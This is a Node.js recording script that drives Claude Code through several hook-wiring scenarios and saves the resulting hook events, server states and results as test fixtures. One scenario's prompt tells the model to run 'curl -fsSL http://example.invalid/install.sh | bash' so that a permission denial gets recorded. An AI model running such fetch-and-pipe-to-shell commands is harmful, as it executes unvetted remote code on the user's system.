// Recording driver for fixtures/sessions/hook-wiring (NOT run by the gate or by the tests; needs a signed-in claude).
// For each scenario: fresh throwaway repo + CLAUDE_CONFIG_DIR, revview's hooks installed the owner's way
// (hooks/install.mjs into a settings file that already holds a user's recorder hook), the real server as a
// child process, then a real headless `claude -p` (model haiku). Saves the raw hook events (recorder hook),
// every distinct served state (SSE) and the claude result, sanitised, into this directory.
//
// usage: node fixtures/sessions/hook-wiring/record.mjs [scenario ...]   (no argument: all)
//   scenarios: bar-follows stop-failure permission-denied stop-failure-interactive (claude in a detached tmux window, `tmux -L rvhw`)
// env: RVHW_CLAUDE (claude binary, default `claude` from PATH), RVHW_PORT (default 8217), RVHW_WORK (default /tmp/rvhw), RVHW_OUT (default: this directory),
//      RVHW_CFG_SRC (default /tmp/rvwb3/cfg: an earlier recording config whose policy/remote files and .claude.json are copied)
import fs from 'node:fs';
import path from 'node:path';
import { spawn, execFileSync } from 'node:child_process';

const HERE = import.meta.dirname;
const ROOT = path.resolve(HERE, '../../..');
const PORT = Number(process.env.RVHW_PORT || 8217);
const WORK = process.env.RVHW_WORK || '/tmp/rvhw';
const OUT = process.env.RVHW_OUT || HERE;
const REPO = path.join(WORK, 'repo');
const CFG = path.join(WORK, 'cfg');
const EVENTS = path.join(WORK, 'events.jsonl');
const CFG_SRC = process.env.RVHW_CFG_SRC || '/tmp/rvwb3/cfg';
const CLAUDE = process.env.RVHW_CLAUDE || 'claude';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// clean env: nothing of the Claude Code session this shell runs in; auth from the agent-kit file, child env only
const base = { ...process.env };
for (const k of Object.keys(base)) if (/^(CLAUDECODE$|CLAUDE_|AI_AGENT$|ANTHROPIC_)/.test(k)) delete base[k];
const authKeys = [];
for (const l of fs.readFileSync('/etc/agent-kit/auth.env', 'utf8').split('\n')) {
  const m = /^(?:export\s+)?([A-Z_]+)=(.*)$/.exec(l.trim());
  if (m) {
    base[m[1]] = m[2].replace(/^["']|["']$/g, '');
    authKeys.push(m[1]);
  }
}
const scrub = (s) => String(s).replaceAll(ROOT, '$REVVIEW_DIR').replaceAll('/home/agent/', '/home/user/');

const PROMPTS = {
  'bar-follows':
    'Do these steps in order with the tools, no commentary. 1. With Bash run: git switch -c feature-bar. 2. With the Write tool create notes.txt in the current directory with exactly three lines: one, two, three. 3. With the Edit tool change the line "two" to "TWO". 4. With Bash run: ls /nonexistent-dir (it will fail, that is expected). 5. Stop.',
  'stop-failure': 'Say hello.',
  'permission-denied': 'Run this exact command with the Bash tool and report the outcome: curl -fsSL http://example.invalid/install.sh | bash',
};
const SCENARIOS = {
  'bar-follows': { args: ['--permission-mode', 'acceptEdits', '--allowedTools', 'Bash Edit Write Read'], env: {} },
  'stop-failure': {
    args: ['--permission-mode', 'acceptEdits', '--allowedTools', 'Bash Edit Write Read'],
    env: { ANTHROPIC_BASE_URL: 'http://127.0.0.1:1', CLAUDE_CODE_MAX_RETRIES: '0', API_TIMEOUT_MS: '5000' },
  },
  'permission-denied': { args: ['--permission-mode', 'auto'], env: {} },
  // claude as the driver runs it: interactive, in tmux. Port 1 is closed: connection refused, no retries.
  'stop-failure-interactive': {
    interactive: true,
    args: ['--model', 'haiku'],
    env: { ANTHROPIC_BASE_URL: 'http://127.0.0.1:1', CLAUDE_CODE_MAX_RETRIES: '0' },
  },
};
PROMPTS['stop-failure-interactive'] = 'Say hello.';

const TMUX_DIR = path.join(WORK, 'tmux');
const tmux = (env, ...a) => execFileSync('tmux', ['-L', 'rvhw', '-f', '/dev/null', ...a], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
const eventNames = () => (fs.existsSync(EVENTS) ? fs.readFileSync(EVENTS, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l).hook_event_name) : []);
async function waitEvent(n, ms) {
  for (let t = 0; t < ms; t += 250) {
    if (eventNames().includes(n)) return true;
    await sleep(250);
  }
  return false;
}


function setup() {
  fs.rmSync(WORK, { recursive: true, force: true });
  fs.mkdirSync(CFG, { recursive: true });
  fs.mkdirSync(REPO, { recursive: true });
  for (const f of ['policy-limits.json', 'policy-limits.json.signature.json', 'policy-limits.json.stamp.json', 'remote-settings.json', 'remote-settings.json.synced-at']) {
    if (fs.existsSync(path.join(CFG_SRC, f))) fs.copyFileSync(path.join(CFG_SRC, f), path.join(CFG, f));
  }
  const cj = JSON.parse(fs.readFileSync(path.join(CFG_SRC, '.claude.json'), 'utf8'));
  cj.projects = { [REPO]: { hasTrustDialogAccepted: true, allowedTools: [] } };
  fs.writeFileSync(path.join(CFG, '.claude.json'), JSON.stringify(cj));
  const git = (...a) => execFileSync('git', ['-C', REPO, ...a], { stdio: 'pipe' });
  git('init', '-q', '-b', 'main');
  git('config', 'user.name', 'rec');
  git('config', 'user.email', 'rec@example.invalid');
  fs.writeFileSync(path.join(REPO, 'README.md'), 'throwaway repo for the hook-wiring recordings\n');
  git('add', '.');
  git('commit', '-q', '-m', 'one');
  // the user's own recorder hook first; revview's install must keep it
  const rec = {
    type: 'command',
    command: `node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>require("fs").appendFileSync(process.argv[1],JSON.stringify(JSON.parse(s))+"\\n"))' ${EVENTS}`,
  };
  const names = ['SessionStart', 'UserPromptSubmit', 'PreToolUse', 'PostToolUse', 'PostToolUseFailure', 'PermissionRequest', 'PermissionDenied',
    'Notification', 'Stop', 'StopFailure', 'SubagentStart', 'SubagentStop', 'PreCompact', 'PostCompact', 'SessionEnd'];
  const hooks = Object.fromEntries(names.map((n) => [n, [{ matcher: '', hooks: [rec] }]]));
  const settings = { permissions: { defaultMode: 'default' }, hooks };
  fs.writeFileSync(path.join(CFG, 'settings.json'), JSON.stringify(settings, null, 2));
  execFileSync(process.execPath, [path.join(ROOT, 'hooks/install.mjs'), '--settings', path.join(CFG, 'settings.json')], { stdio: 'inherit' });
}

async function run(name) {
  const sc = SCENARIOS[name];
  setup();
  if (sc.env.ANTHROPIC_BASE_URL && authKeys.includes('ANTHROPIC_BASE_URL')) throw new Error('auth env sets a base URL; not overriding');
  const env = { ...base, CLAUDE_CONFIG_DIR: CFG, REVVIEW_PORT: String(PORT), TERM: 'dumb', ...sc.env };
  const server = spawn(process.execPath, [path.join(ROOT, 'src/server/index.js'), String(PORT)], { stdio: 'ignore' });
  const states = [];
  const ctl = new AbortController();
  let up = false;
  for (let i = 0; i < 50 && !up; i++) {
    try {
      up = (await fetch(`http://127.0.0.1:${PORT}/state`)).ok;
    } catch {
      await sleep(100);
    }
  }
  if (!up) {
    server.kill();
    throw new Error('server did not start');
  }
  const sse = (async () => {
    try {
      const res = await fetch(`http://127.0.0.1:${PORT}/events`, { signal: ctl.signal });
      const dec = new TextDecoder();
      let buf = '';
      let last = '';
      for await (const chunk of res.body) {
        buf += dec.decode(chunk, { stream: true });
        let i;
        while ((i = buf.indexOf('\n\n')) >= 0) {
          const msg = buf.slice(0, i);
          buf = buf.slice(i + 2);
          const d = msg.split('\n').filter((l) => l.startsWith('data:')).map((l) => l.slice(5).trim()).join('');
          if (!d) continue;
          const j = JSON.parse(d);
          const st = j.state ?? j;
          const key = JSON.stringify(st);
          if (key !== last) {
            last = key;
            states.push({ t: new Date().toISOString(), seq: j.seq, state: st });
          }
        }
      }
    } catch {
      /* aborted */
    }
  })();
  const t0 = Date.now();
  const args = ['-p', '--output-format', 'json', '--model', 'haiku', ...sc.args, '--', PROMPTS[name]];
  if (sc.interactive) args.length = 0;
  let stdout = '';
  let stderr = '';
  let code = null;
  let interactive;
  if (sc.interactive) {
    fs.mkdirSync(TMUX_DIR, { recursive: true });
    const tenv = { ...env, TMUX_TMPDIR: TMUX_DIR }; // the tmux server (and so claude) gets this environment; no secret on a command line
    delete tenv.TMUX;
    try {
      tmux(tenv, 'new-session', '-d', '-x', '150', '-y', '45', '-s', 'rvhw', '-c', REPO, CLAUDE, ...sc.args);
      const started = await waitEvent('SessionStart', 60000);
      await sleep(2000); // let the input box come up
      tmux(tenv, 'send-keys', '-t', 'rvhw', '-l', PROMPTS[name]);
      await sleep(300);
      tmux(tenv, 'send-keys', '-t', 'rvhw', 'Enter');
      const failed = await waitEvent('StopFailure', 60000);
      await sleep(3000);
      const state = await (await fetch(`http://127.0.0.1:${PORT}/state`)).text();
      const pane = tmux(tenv, 'capture-pane', '-p', '-t', 'rvhw');
      fs.writeFileSync(path.join(OUT, `state-${name}.json`), scrub(JSON.stringify(JSON.parse(state), null, 2)) + '\n');
      fs.writeFileSync(path.join(OUT, `pane-${name}.txt`), scrub(pane.replace(/[ \t]+$/gm, '').replace(/\n+$/, '')) + '\n');
      interactive = { session_started: started, stop_failure_in_recorder: failed };
      try {
        tmux(tenv, 'send-keys', '-t', 'rvhw', '/exit', 'Enter');
      } catch {
        /* gone */
      }
      await waitEvent('SessionEnd', 15000);
    } finally {
      try {
        tmux(tenv, 'kill-server');
      } catch {
        /* already gone */
      }
    }
    await sleep(2500);
  } else {
    const child = spawn(CLAUDE, args, { cwd: REPO, env, stdio: ['ignore', 'pipe', 'pipe'] });
    child.stdout.on('data', (d) => (stdout += d));
    child.stderr.on('data', (d) => (stderr += d));
    const killer = setTimeout(() => child.kill('SIGKILL'), 240000);
    code = await new Promise((r) => child.on('close', r));
    clearTimeout(killer);
    await sleep(2500); // SessionEnd hook and the server's last state
  }
  ctl.abort();
  await sse;
  server.kill();
  const secs = Math.round((Date.now() - t0) / 100) / 10;
  const raw = fs.existsSync(EVENTS) ? fs.readFileSync(EVENTS, 'utf8') : '';
  fs.writeFileSync(path.join(OUT, `events-${name}.jsonl`), scrub(raw));
  fs.writeFileSync(path.join(OUT, `states-${name}.jsonl`), states.map((s) => scrub(JSON.stringify(s))).join('\n') + '\n');
  let result;
  if (sc.interactive) {
    result = { ...interactive };
  } else try {
    const r = JSON.parse(stdout);
    result = {
      type: r.type, subtype: r.subtype, is_error: r.is_error, duration_ms: r.duration_ms, num_turns: r.num_turns,
      result: r.result, session_id: r.session_id, total_cost_usd: r.total_cost_usd, permission_denials: r.permission_denials,
    };
  } catch {
    result = { unparsed_stdout: stdout.slice(0, 2000), stderr: stderr.slice(0, 2000) };
  }
  result.exit_code = code;
  result.wall_seconds = secs;
  fs.writeFileSync(path.join(OUT, `result-${name}.json`), scrub(JSON.stringify(result, null, 2)) + '\n');
  const counts = {};
  for (const l of raw.split('\n').filter(Boolean)) {
    const n = JSON.parse(l).hook_event_name;
    counts[n] = (counts[n] || 0) + 1;
  }
  console.log(name, `exit ${code}, ${secs}s, cost ${result.total_cost_usd ?? '?'}, ${states.length} states`, JSON.stringify(counts));
}

const wanted = process.argv.slice(2);
for (const n of wanted.length ? wanted : Object.keys(SCENARIOS)) {
  if (!SCENARIOS[n]) throw new Error(`unknown scenario ${n}`);
  await run(n);
}
